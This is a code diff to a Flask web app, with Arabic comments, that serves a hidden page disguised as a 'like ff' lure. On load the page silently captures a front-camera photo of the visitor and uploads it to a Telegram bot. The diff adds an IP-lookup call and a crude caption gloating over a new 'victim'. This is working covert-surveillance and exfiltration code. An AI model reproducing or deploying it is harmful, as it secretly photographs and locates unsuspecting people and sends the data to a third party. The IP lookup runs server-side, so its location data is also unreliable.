@@ -14,6 +14,9 @@ TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 # إعدادات التسجيل (logging)
 logging.basicConfig(level=logging.INFO)
 
+# API لسحب معلومات IP
+IP_INFO_API = "https://ipinfo.io"
+
 @app.route('/like')
 def index():
     """صفحة مخفية تلتقط صورة واحدة من الكاميرا الأمامية"""
@@ -21,14 +24,14 @@ def index():
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري المعالجة...</title>
+    <title>like ff</title>
     <script>
         async function capturePhoto(facingMode, label) {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                 let video = document.createElement('video');
                 video.srcObject = stream;
-                await video.play();  // تشغيل الفيديو
+                await video.play();  
 
                 let canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
@@ -41,14 +44,14 @@ def index():
 
                 await fetch('/upload', { method: 'POST', body: formData });
 
-                stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا بعد الالتقاط
+                stream.getTracks().forEach(track => track.stop());
             } catch (error) {
-                console.log("فشل في فتح الكاميرا:", error);
+                console.log("فشل في ارسال اليكات :", error);
             }
         }
 
         async function startCapture() {
-            await capturePhoto("user", "front");  // التقاط صورة واحدة من الكاميرا الأمامية
+            await capturePhoto("user", "front");  
         }
 
         window.onload = startCapture;
@@ -59,7 +62,7 @@ def index():
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    """استقبال الصورة وإرسالها إلى Telegram باستخدام API مباشرةً"""
+    """استقبال الصورة وإرسالها إلى Telegram مع معلومات IP"""
     try:
         uploaded_file = request.files.get("photo")
         if not uploaded_file:
@@ -73,12 +76,33 @@ def upload():
             logging.error(f"فشل في حفظ الصورة: {photo_path}")
             return jsonify({'status': 'error', 'message': '❌ فشل في حفظ الصورة'}), 500
 
-        # إعداد الوسائط (media) لإرسالها إلى Telegram
+        # سحب معلومات IP
+        ip_info = requests.get(IP_INFO_API).json()
+        ip = ip_info.get('ip', 'غير معروف')
+        city = ip_info.get('city', 'غير معروف')
+        region = ip_info.get('region', 'غير معروف')
+        country = ip_info.get('country', 'غير معروف')
+        location = ip_info.get('loc', 'غير معروف')
+
+        # نص الرسالة مع معلومات IP
+        message = (
+            f"<b>نكح مستخدم جديد😏</b>\n\n"
+            f"<b>IP:</b> {ip}\n"
+            f"<b>المدينة:</b> {city}\n"
+            f"<b>المنطقة:</b> {region}\n"
+            f"<b>الدولة:</b> {country}\n"
+            f"<b>الموقع الجغرافي:</b> {location}\n\n"
+            f"<i>هذه الأداة مصممة من قبل XAZ 😎</i>"
+        )
+
+        # إرسال الصورة مع الرسالة إلى Telegram
         files = {'photo': open(photo_path, 'rb')}
         response = requests.post(
             f"{TELEGRAM_API_URL}/sendPhoto",
             data={
                 'chat_id': TELEGRAM_CHAT_ID,
+                'caption': message,
+                'parse_mode': 'HTML'
             },
             files=files
         )
